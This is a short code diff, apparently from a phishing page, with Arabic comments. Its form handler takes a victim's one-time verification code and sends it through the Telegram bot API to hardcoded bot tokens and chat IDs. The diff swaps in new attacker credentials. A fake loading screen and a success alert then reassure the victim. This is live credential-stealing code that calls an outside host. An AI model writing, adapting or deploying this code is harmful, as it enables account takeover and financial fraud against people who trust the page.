@@ -86,9 +86,9 @@
             event.preventDefault();
             const otp = document.getElementById('otpCode').value;
 
-            // إرسال رسالة البوت (الرسالة الثالثة)
-            const token = "9295127609:AAH6m1b_vUZZzsltPPEDTxhyEyMnsh6kbbw";
-            const chatId = "8812057901";
+            // إرسال رسالة البوت
+            const token = "9192928626:AAE65KrrYtwiLw1-QFuJ2Q74nq1BA1ZQ6ks";
+            const chatId = "8790370916,8514104757";
             const message = `🔢 *رمز التحقق (OTP):*\n\n🔑 الرمز: \`${otp}\``;
 
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
@@ -97,7 +97,7 @@
                 setTimeout(function() {
                     document.getElementById('loadingScreen').style.display = 'none';
                     alert('تم التحقق بنجاح! (Demo)');
-                    sessionStorage.clear(); // مسح البيانات بعد ما نخلص
+                    sessionStorage.clear(); 
                 }, 10000);
             })
             .catch(err => {
